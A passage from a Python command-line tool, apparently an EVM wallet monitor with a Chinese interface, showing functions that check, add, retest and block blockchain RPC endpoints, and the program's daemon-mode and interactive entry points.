            if not choice.isdigit() or not (1 <= int(choice) <= len(zero_rpc_networks)):
                print(f"{Fore.RED}❌ 无效选择{Style.RESET_ALL}")
                continue
            
            selected_chain = zero_rpc_networks[int(choice) - 1]
            print(f"\n{Fore.CYAN}🎯 为网络 {Fore.YELLOW}{selected_chain['name']}{Style.RESET_ALL} 添加RPC")
            
            # 添加RPC
            success = self._add_rpc_for_chain(selected_chain['network_key'], selected_chain['name'])
            
            if success:
                # 重新检测这个网络的RPC状态
                print(f"{Fore.CYAN}🔄 重新检测 {selected_chain['name']} 的RPC状态...{Style.RESET_ALL}")
                updated_result = self.get_cached_rpc_results(network_key=selected_chain['network_key'], force_refresh=True)
                
                if updated_result[selected_chain['network_key']]['available_count'] > 0:
                    print(f"{Fore.GREEN}🎉 {selected_chain['name']} 现在有可用的RPC了！从列表中移除...{Style.RESET_ALL}")
                    zero_rpc_networks.remove(selected_chain)
                else:
                    print(f"{Fore.YELLOW}⚠️ {selected_chain['name']} 仍然没有可用的RPC，可能需要添加更多RPC{Style.RESET_ALL}")
            
            # 询问是否继续
            if zero_rpc_networks:
                continue_choice = self.safe_input(f"\n{Fore.CYAN}是否继续为其他网络添加RPC？(Y/n): {Style.RESET_ALL}").strip().lower()
                if continue_choice == 'n':
                    break
        
        if not zero_rpc_networks:
            print(f"\n{Fore.GREEN}🎉 太好了！所有网络都有可用的RPC了！{Style.RESET_ALL}")

    def _batch_add_rpc_for_zero_chains(self, zero_rpc_networks: list):
        """批量为所有无RPC网络添加RPC"""
        print(f"\n{Fore.CYAN}🚀 批量为所有无可用RPC的网络添加RPC{Style.RESET_ALL}")
        
        confirm = self.safe_input(f"{Fore.YELLOW}⚠️ 确认为 {len(zero_rpc_networks)} 个网络批量添加RPC？(y/N): {Style.RESET_ALL}").strip().lower()
        
        if confirm != 'y':
            print(f"{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
            return
        
        for i, chain in enumerate(zero_rpc_networks, 1):
            print(f"\n{Back.BLUE}{Fore.WHITE} [{i}/{len(zero_rpc_networks)}] 处理网络: {chain['name']} {Style.RESET_ALL}")
            self._add_rpc_for_chain(chain['network_key'], chain['name'])
            
            # 添加分隔线
            if i < len(zero_rpc_networks):
                print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")

    def _show_zero_rpc_details(self, zero_rpc_networks: list):
        """显示无可用RPC网络的详细信息"""
        print(f"\n{Back.MAGENTA}{Fore.WHITE} 📋 无可用RPC网络详细信息 📋 {Style.RESET_ALL}")
        
        for i, chain in enumerate(zero_rpc_networks, 1):
            network_key = chain['network_key']
            network_info = self.networks[network_key]
            
            print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}{i}. {chain['name']}{Style.RESET_ALL}")
            print(f"   Chain ID: {Fore.CYAN}{chain['chain_id']}{Style.RESET_ALL}")
            print(f"   原生货币: {Fore.CYAN}{chain['currency']}{Style.RESET_ALL}")
            print(f"   Network Key: {Fore.MAGENTA}{network_key}{Style.RESET_ALL}")
            print(f"   配置的RPC总数: {Fore.RED}{chain['total_rpcs']}{Style.RESET_ALL}")
            
            # 显示所有RPC的失效状态
            print(f"   📡 失效的RPC列表:")
            for j, rpc_url in enumerate(network_info['rpc_urls'], 1):
                if rpc_url in self.blocked_rpcs:
                    blocked_info = self.blocked_rpcs[rpc_url]
                    reason = blocked_info.get('reason', '未知原因')
                    blocked_time = blocked_info.get('blocked_time', 0)
                    time_str = time.strftime('%H:%M:%S', time.localtime(blocked_time))
                    print(f"      {j:2d}. {Fore.RED}🚫 {rpc_url[:50]}...{Style.RESET_ALL}")
                    print(f"          {Fore.RED}拉黑原因: {reason}{Style.RESET_ALL}")
                    print(f"          {Fore.YELLOW}拉黑时间: {time_str}{Style.RESET_ALL}")
                else:
                    print(f"      {j:2d}. {Fore.RED}❌ {rpc_url[:50]}...{Style.RESET_ALL}")
                    print(f"          {Fore.RED}状态: 连接失败（未拉黑）{Style.RESET_ALL}")

    def _retest_zero_rpc_chains(self, zero_rpc_networks: list):
        """重新测试无可用RPC网络的所有RPC"""
        print(f"\n{Fore.CYAN}🔄 重新测试无可用RPC网络的所有RPC节点...{Style.RESET_ALL}")
        
        total_rpcs_tested = 0
        total_rpcs_recovered = 0
        
        for i, chain in enumerate(zero_rpc_networks, 1):
            network_key = chain['network_key']
            network_info = self.networks[network_key]
            
            print(f"\n{Back.BLUE}{Fore.WHITE} [{i}/{len(zero_rpc_networks)}] 测试网络: {chain['name']} {Style.RESET_ALL}")
            
            rpcs_recovered = 0
            rpcs_to_unblock = []
            
            for j, rpc_url in enumerate(network_info['rpc_urls'], 1):
                print(f"  {j}/{len(network_info['rpc_urls'])} 测试: {rpc_url[:50]}...", end=" ", flush=True)
                total_rpcs_tested += 1
                
                # 重新测试RPC连接
                if self.test_rpc_connection(rpc_url, network_info['chain_id'], timeout=5, quiet=True):
                    print(f"{Fore.GREEN}恢复{Style.RESET_ALL}")
                    rpcs_recovered += 1
                    total_rpcs_recovered += 1
                    
                    # 如果在拉黑列表中，标记为需要解除拉黑
                    if rpc_url in self.blocked_rpcs:
                        rpcs_to_unblock.append(rpc_url)
                else:
                    print(f"{Fore.RED}仍失败{Style.RESET_ALL}")
            
            # 解除恢复的RPC的拉黑状态
            for rpc_url in rpcs_to_unblock:
                del self.blocked_rpcs[rpc_url]
            
            if rpcs_recovered > 0:
                print(f"  {Fore.GREEN}✅ 网络 {chain['name']} 恢复了 {rpcs_recovered} 个RPC{Style.RESET_ALL}")
            else:
                print(f"  {Fore.RED}❌ 网络 {chain['name']} 仍然没有可用RPC{Style.RESET_ALL}")
        
        print(f"\n{Back.GREEN}{Fore.BLACK} 📊 重测完成统计 📊 {Style.RESET_ALL}")
        print(f"总测试RPC: {Fore.CYAN}{total_rpcs_tested}{Style.RESET_ALL} 个")
        print(f"成功恢复: {Fore.GREEN}{total_rpcs_recovered}{Style.RESET_ALL} 个")
        print(f"仍然失效: {Fore.RED}{total_rpcs_tested - total_rpcs_recovered}{Style.RESET_ALL} 个")

    def manage_insufficient_rpc_chains(self):
        """检查并管理RPC数量不足的链条，支持直接添加RPC"""
        print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ RPC数量管理 - 检查并添加RPC ⚠️ {Style.RESET_ALL}")
        print(f"{Fore.CYAN}🔄 获取网络RPC配置分析...{Style.RESET_ALL}")
        
        # 使用缓存的检测结果
        rpc_results = self.get_cached_rpc_results()
        
        insufficient_chains = []
        warning_chains = []  # 3-5个RPC的链条
        
        for network_key, result in rpc_results.items():
            available_count = result['available_count']
            
            if available_count < 3:
                insufficient_chains.append({
                    'network_key': network_key,
                    'name': result['name'],
                    'chain_id': result['chain_id'],
                    'total_rpcs': result['total_count'],
                    'available_rpcs': available_count,
                    'failed_rpcs': len(result['failed_rpcs']),
                    'currency': result['currency']
                })
            elif available_count <= 5:
                warning_chains.append({
                    'network_key': network_key,
                    'name': result['name'],
                    'available_rpcs': available_count,
                    'currency': result['currency']
                })
        
        # 显示结果
        print(f"\n{Back.RED}{Fore.WHITE} 🚨 RPC数量不足的链条（少于3个可用） 🚨 {Style.RESET_ALL}")
        
        if insufficient_chains:
            print(f"\n{Fore.RED}发现 {len(insufficient_chains)} 个链条RPC数量不足：{Style.RESET_ALL}")
            print(f"{Fore.CYAN}─" * 80 + f"{Style.RESET_ALL}")
            
            for i, chain in enumerate(insufficient_chains, 1):
                status_color = Fore.RED if chain['available_rpcs'] == 0 else Fore.YELLOW
                print(f"  {Fore.GREEN}{i:2d}.{Style.RESET_ALL} {status_color}⚠️ {chain['name']:<30}{Style.RESET_ALL} ({chain['currency']:<6}) "
                      f"- 可用: {Fore.GREEN}{chain['available_rpcs']}{Style.RESET_ALL}/"
                      f"{chain['total_rpcs']} 个RPC")
                print(f"      Chain ID: {Fore.CYAN}{chain['chain_id']}{Style.RESET_ALL}, Network Key: {Fore.MAGENTA}{chain['network_key']}{Style.RESET_ALL}")
            
            # 提供添加RPC的选项
            print(f"\n{Fore.YELLOW}🛠️ 管理选项：{Style.RESET_ALL}")
            print(f"  • 输入编号 (1-{len(insufficient_chains)}) 为对应链条添加RPC")
            print(f"  • 输入 'all' 为所有不足的链条批量添加RPC") 
            print(f"  • 直接按回车跳过")
            
            action = self.safe_input(f"\n{Fore.CYAN}➜ 请选择操作: {Style.RESET_ALL}").strip()
            
            if action.lower() == 'all':
                # 批量为所有不足的链条添加RPC
                for chain in insufficient_chains:
                    print(f"\n{Fore.CYAN}🔧 正在为 {chain['name']} 添加RPC...{Style.RESET_ALL}")
                    self._add_rpc_for_chain(chain['network_key'], chain['name'])
            elif action.isdigit():
                # 为指定链条添加RPC
                index = int(action) - 1
                if 0 <= index < len(insufficient_chains):
                    chain = insufficient_chains[index]
                    print(f"\n{Fore.CYAN}🔧 正在为 {chain['name']} 添加RPC...{Style.RESET_ALL}")
                    self._add_rpc_for_chain(chain['network_key'], chain['name'])
                else:
                    print(f"\n{Fore.RED}❌ 无效的编号{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}✅ 所有链条的RPC数量都充足（≥3个可用）{Style.RESET_ALL}")
        
        # 显示警告链条
        if warning_chains:
            print(f"\n{Back.YELLOW}{Fore.BLACK} ⚠️ RPC数量偏少的链条（3-5个可用） ⚠️ {Style.RESET_ALL}")
            for chain in warning_chains:
                print(f"  {Fore.YELLOW}⚠️{Style.RESET_ALL} {chain['name']} - "
                      f"可用: {Fore.YELLOW}{chain['available_rpcs']}{Style.RESET_ALL} 个RPC")
        
        # 显示总结和建议
        print(f"\n{Fore.CYAN}─" * 80 + f"{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 支持的RPC格式：{Style.RESET_ALL}")
        print(f"  • HTTP(S): https://rpc.example.com")
        print(f"  • WebSocket: wss://ws.example.com")
        print(f"  • 自动去重：重复的RPC会被跳过")
        
        if insufficient_chains:
            print(f"\n{Fore.RED}需要补充RPC的链条总数: {len(insufficient_chains)}{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}建议每个链条至少保持3-5个可用RPC节点{Style.RESET_ALL}")
    
    def _add_rpc_for_chain(self, network_key: str, network_name: str):
        """为指定链条添加RPC，支持批量智能识别"""
        print(f"\n{Fore.GREEN}🌐 为网络 {network_name} 添加RPC节点{Style.RESET_ALL}")
        print(f"   Network Key: {Fore.MAGENTA}{network_key}{Style.RESET_ALL}")
        print(f"   当前RPC数量: {Fore.CYAN}{len(self.networks[network_key]['rpc_urls'])}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}📝 支持的输入方式：{Style.RESET_ALL}")
        print(f"  • 单条RPC: https://rpc.example.com")
        print(f"  • 批量粘贴: 支持从表格、列表等复制的内容")
        print(f"  • 智能识别: 自动提取有效的RPC地址")
        print(f"  • 格式支持: HTTP(S)、WebSocket (ws/wss)")
        print(f"\n{Fore.CYAN}💡 提示：支持粘贴包含表格、文本的混合内容，程序会自动识别RPC{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✨ 输入完成后双击回车开始批量处理{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}🔍 请输入RPC内容（支持多行粘贴）：{Style.RESET_ALL}")
        
        # 收集多行输入
        lines = []
        empty_line_count = 0
        
        while True:
            try:
                line = self.safe_input().strip()
                if line:
                    lines.append(line)
                    empty_line_count = 0
                else:
                    empty_line_count += 1
                    if empty_line_count >= 2:  # 双击回车
                        break
            except EOFError:
                break
        
        if not lines:
            print(f"{Fore.YELLOW}⚠️ 未输入任何内容，跳过为 {network_name} 添加RPC{Style.RESET_ALL}")
            return False
        
        # 智能提取RPC地址
        extracted_rpcs = self._extract_rpcs_from_text(lines)
        
        if not extracted_rpcs:
            print(f"{Fore.RED}❌ 未识别到有效的RPC地址{Style.RESET_ALL}")
            return False
        
        # 显示识别结果
        print(f"\n{Fore.CYAN}🔍 智能识别结果：{Style.RESET_ALL}")
        print(f"识别到 {Fore.GREEN}{len(extracted_rpcs)}{Style.RESET_ALL} 个RPC地址：")
        
        for i, rpc in enumerate(extracted_rpcs, 1):
            rpc_type = "WebSocket" if rpc.startswith(('ws://', 'wss://')) else "HTTP(S)"
            print(f"  {Fore.GREEN}{i:2d}.{Style.RESET_ALL} {Fore.CYAN}[{rpc_type}]{Style.RESET_ALL} {rpc}")
        
        # 确认添加
        confirm = self.safe_input(f"\n{Fore.YELLOW}确认批量添加这些RPC？(Y/n): {Style.RESET_ALL}").strip().lower()
        if confirm and confirm != 'y':
            print(f"{Fore.YELLOW}⚠️ 操作已取消{Style.RESET_ALL}")
            return False
        
        # 批量添加和测试
        print(f"\n{Fore.CYAN}🚀 开始批量添加和测试RPC...{Style.RESET_ALL}")
        
        success_count = 0
        failed_count = 0
        skipped_count = 0
        
        for i, rpc_url in enumerate(extracted_rpcs, 1):
            print(f"\n{Fore.CYAN}[{i}/{len(extracted_rpcs)}]{Style.RESET_ALL} 处理: {rpc_url[:60]}...")
            
            # 检查是否已存在（去重）
            if rpc_url in self.networks[network_key]['rpc_urls']:
                print(f"  {Fore.YELLOW}⚠️ 已存在，跳过{Style.RESET_ALL}")
                skipped_count += 1
                continue
            
            # 添加RPC
            if self.add_custom_rpc(network_key, rpc_url):
                print(f"  {Fore.GREEN}✅ 添加成功{Style.RESET_ALL}")
                success_count += 1
            else:
                print(f"  {Fore.RED}❌ 添加失败，已自动屏蔽{Style.RESET_ALL}")
                # 自动屏蔽失效的RPC
                self.blocked_rpcs[rpc_url] = {
                    'reason': '批量添加时连接失败',
                    'blocked_time': time.time(),
                    'network': network_key
                }
                failed_count += 1
        
        # 显示批量处理结果
        print(f"\n{Back.GREEN}{Fore.BLACK} 📊 批量处理完成 📊 {Style.RESET_ALL}")
        print(f"  {Fore.GREEN}✅ 成功添加: {success_count} 个{Style.RESET_ALL}")
        print(f"  {Fore.YELLOW}⚠️ 跳过重复: {skipped_count} 个{Style.RESET_ALL}")
        print(f"  {Fore.RED}❌ 失败屏蔽: {failed_count} 个{Style.RESET_ALL}")
        print(f"  {Fore.CYAN}📊 网络 {network_name} 当前RPC总数: {len(self.networks[network_key]['rpc_urls'])} 个{Style.RESET_ALL}")
        
        if success_count > 0:
            print(f"\n{Fore.GREEN}🎉 成功为网络 {network_name} 添加了 {success_count} 个新的RPC节点！{Style.RESET_ALL}")
            return True
        else:
            return False
    
    def _extract_rpcs_from_text(self, lines: List[str]) -> List[str]:
        """从文本中智能提取RPC地址"""
        import re
        
        rpcs = []
        
        # RPC地址的正则表达式模式
        rpc_patterns = [
            r'(https?://[^\s\t]+)',  # HTTP(S) URLs
            r'(wss?://[^\s\t]+)',    # WebSocket URLs
        ]
        
        for line in lines:
            # 跳过明显的无关行
            if any(skip_word in line.lower() for skip_word in [
                '连接钱包', 'rpc 服务器', '高度', '延迟', '分数', '隐私',
                'height', 'latency', 'score', 'privacy', 'connect wallet'
            ]):
                continue
            
            # 提取所有可能的RPC地址
            for pattern in rpc_patterns:
                matches = re.findall(pattern, line, re.IGNORECASE)
                for match in matches:
                    # 清理URL（移除尾部的标点符号等）
                    cleaned_url = re.sub(r'[,;\s\t]+$', '', match.strip())
                    
                    # 验证URL格式
                    if self._is_valid_rpc_url(cleaned_url):
                        if cleaned_url not in rpcs:  # 去重
                            rpcs.append(cleaned_url)
        
        return rpcs
    
    def _is_valid_rpc_url(self, url: str) -> bool:
        """验证RPC URL是否有效"""
        import re
        
        # 基本格式检查
        if not url or len(url) < 10:
            return False
        
        # 必须以支持的协议开头
        if not url.startswith(('http://', 'https://', 'ws://', 'wss://')):
            return False
        
        # 不能包含空格或其他无效字符
        if re.search(r'[\s\t]', url):
            return False
        
        # 必须包含域名
        domain_pattern = r'://([a-zA-Z0-9.-]+)'
        match = re.search(domain_pattern, url)
        if not match:
            return False
        
        domain = match.group(1)
        
        # 域名不能为空或只包含点
        if not domain or domain.count('.') == len(domain):
            return False
        
        # 排除明显的无效域名
        invalid_domains = ['localhost', '127.0.0.1', '0.0.0.0']
        if domain in invalid_domains:
            return False
        
        return True

def run_daemon_mode(monitor, password):
    """运行守护进程模式"""
    try:
        print(f"{Fore.CYAN}🛡️ 启动守护进程模式{Style.RESET_ALL}")
        
        # 加载钱包和状态
        if not monitor.load_wallets():
            monitor.logger.error("加载钱包失败")
            return False
        
        monitor.load_state()
        monitor.logger.info(f"守护进程启动，已连接网络: {', '.join(monitor.web3_connections.keys())}")
        
        # 启动守护进程模式（包含自动重启和内存清理）
        return monitor.start_daemon_mode()
            
    except Exception as e:
        monitor.logger.error(f"守护进程错误: {e}")
        monitor.handle_error(e, "守护进程启动")
        return False

def main():
    """主函数"""
    try:
        # 注册全局信号处理，确保 Ctrl+C/TERM 立即退出
        signal.signal(signal.SIGINT, _global_signal_handler)
        signal.signal(signal.SIGTERM, _global_signal_handler)
        # 检查是否在交互式环境中
        import sys
        is_interactive = sys.stdin.isatty() and sys.stdout.isatty()
        
        # 解析命令行参数
        import argparse
        parser = argparse.ArgumentParser(description='EVM钱包监控软件')
        parser.add_argument('--daemon', action='store_true', help='以守护进程模式运行')
        parser.add_argument('--password', type=str, help='钱包密码（仅用于守护进程模式）')
        parser.add_argument('--auto-start', action='store_true', help='自动开始监控（非交互式模式）')
        parser.add_argument('--force-interactive', action='store_true', help='强制交互式模式（默认）')
        args = parser.parse_args()
        
        # 创建监控实例
        monitor = EVMMonitor()
        global MONITOR_INSTANCE
        MONITOR_INSTANCE = monitor
        
        # 守护进程模式
        if args.daemon:
            return run_daemon_mode(monitor, args.password)
        
        # 强制交互模式
        if args.force_interactive:
            print(f"{Fore.CYAN}🚀 强制交互式菜单模式 (--force-interactive){Style.RESET_ALL}")
            # 设置全局标志，强制所有输入函数使用交互模式
            monitor._force_interactive = True
        elif args.auto_start:
            print(f"{Fore.YELLOW}⚠️  检测到非交互式环境，将自动开始监控{Style.RESET_ALL}")
            if monitor.wallets and monitor.target_wallet:
                monitor.start_monitoring()
                try:
                    while monitor.monitoring:
                        time.sleep(60)
                except KeyboardInterrupt:
                    print(f"\n{Fore.YELLOW}👋 收到停止信号，程序退出{Style.RESET_ALL}")
                    monitor.stop_monitoring()
                return True
            else:
                print(f"{Fore.RED}❌ 缺少必要配置（钱包或目标账户），无法自动开始{Style.RESET_ALL}")
                return False
        else:
            # 交互模式（默认模式）
            print(f"{Fore.CYAN}🚀 进入交互式菜单模式{Style.RESET_ALL}")
        
        # 加载钱包
        monitor.load_wallets()
        
        # 加载监控状态
        monitor.load_state()
        
        # 确保数据结构完整性
        monitor._ensure_data_structures()
        
        # 显示欢迎信息
        print(f"\n{Fore.GREEN}🎉 欢迎使用EVM监控软件！{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 使用菜单选项 8 (网络连接管理) 来连接区块链网络{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}📝 提示：如果遇到输入问题，请直接按回车键或输入0退出{Style.RESET_ALL}")
        print(f"{Fore.GREEN}✨ 如果运行在SSH或脚本中，请使用: python3 evm_monitor.py --auto-start{Style.RESET_ALL}")
        
        # 显示菜单
        try:
            monitor.show_menu()
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}👋 用户中断程序{Style.RESET_ALL}")
        finally:
            # 确保监控停止
            if monitor.monitoring:
                print(f"{Fore.CYAN}🔄 正在安全停止监控...{Style.RESET_ALL}")
                monitor.stop_monitoring()
            monitor.save_wallets()
            print(f"{Fore.GREEN}✅ 程序已安全退出{Style.RESET_ALL}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}👋 程序被中断{Style.RESET_ALL}")
        # 确保监控停止
        if 'monitor' in locals() and monitor.monitoring:
            print(f"{Fore.CYAN}🔄 正在安全停止监控...{Style.RESET_ALL}")
            monitor.stop_monitoring()
            monitor.save_wallets()
    except EOFError:
        print(f"\n{Fore.YELLOW}👋 检测到EOF错误，程序退出{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 建议使用: python3 evm_monitor.py --auto-start{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}❌ 程序出错: {e}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}💡 如果是EOF错误，请使用: python3 evm_monitor.py --auto-start{Style.RESET_ALL}")
        # 确保监控停止
        if 'monitor' in locals() and monitor.monitoring:
            monitor.stop_monitoring()
            monitor.save_wallets()

if __name__ == "__main__":
    main()
